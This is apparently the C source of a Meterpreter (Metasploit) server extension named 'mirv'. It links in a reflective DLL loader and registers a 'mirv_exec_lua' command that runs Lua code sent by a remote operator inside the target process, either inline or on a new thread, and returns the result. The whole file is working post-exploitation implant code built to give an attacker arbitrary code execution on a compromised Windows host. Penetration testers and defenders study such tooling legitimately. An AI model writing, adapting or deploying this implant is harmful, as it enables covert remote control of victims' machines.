/*
* This server feature extension provides:
*
*
*/
#include "mirv.h"

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

#include "lua.h"
#include "lualib.h"
#include "lauxlib.h"
#include <windows.h>

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

LPCSTR do_lua(LPCSTR lua_code){
	lua_State *l;
	l = luaL_newstate();
	luaL_openlibs(l);
	luaL_dostring(l,lua_code);	
	return lua_tostring(l, -1);
}
DWORD WINAPI LuaThreadProc(
	__in  LPVOID lpParameter
	){
		LPCSTR lua_ret;
		lua_ret=do_lua((LPCSTR)lpParameter);
		return 0;
}

DWORD request_mirv_exec_lua(Remote *remote, Packet *packet)
{
	LPCSTR lua_code;
	LPCSTR lua_ret;
	DWORD dwResult    = ERROR_SUCCESS;	
	DWORD threadID;
	DWORD threadErrCode;
	Packet * response = NULL;
	BOOLEAN newThread;
	LPVOID lpMsgBuf;

	lua_code= packet_get_tlv_value_string(packet,TLV_TYPE_MIRV_LUA_CODE);
	newThread=packet_get_tlv_value_bool(packet,TLV_TYPE_MIRV_NEWTHREAD);
	response = packet_create_response( packet );
	if (newThread){
		if(NULL==CreateThread(NULL,
			0,
			&LuaThreadProc,
			(LPVOID) lua_code,
			0,
			&threadID)){
				threadErrCode=GetLastError();
				FormatMessage(
					FORMAT_MESSAGE_ALLOCATE_BUFFER | 
					FORMAT_MESSAGE_FROM_SYSTEM |
					FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL,
					threadErrCode,
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
					(LPTSTR) &lpMsgBuf,
					0, NULL );
				packet_add_tlv_string(response,TLV_TYPE_MIRV_LUA_RETMSG,(LPCSTR) lpMsgBuf); //FIXME: not a pretty conversion
				dwResult = -1;
		}
		packet_add_tlv_string(response,TLV_TYPE_MIRV_LUA_RETMSG,"Thread started successfully");
		packet_add_tlv_uint(response,TLV_TYPE_MIRV_RET_THREADID,threadID);
	}else{
		lua_ret=do_lua(lua_code);
		packet_add_tlv_string(response,TLV_TYPE_MIRV_LUA_RETMSG,lua_ret);
	}

	packet_transmit_response( dwResult, remote, response );
	return dwResult;
}

Command customCommands[] =
{
	{ "mirv_exec_lua",
	{ request_mirv_exec_lua,                                    { 0 }, 0 },
	{ EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	{ EMPTY_DISPATCH_HANDLER                      },
	{ EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
* Initialize the server extension
*/
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
		customCommands[index].method;
		index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
* Deinitialize the server extension
*/
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
		customCommands[index].method;
		index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
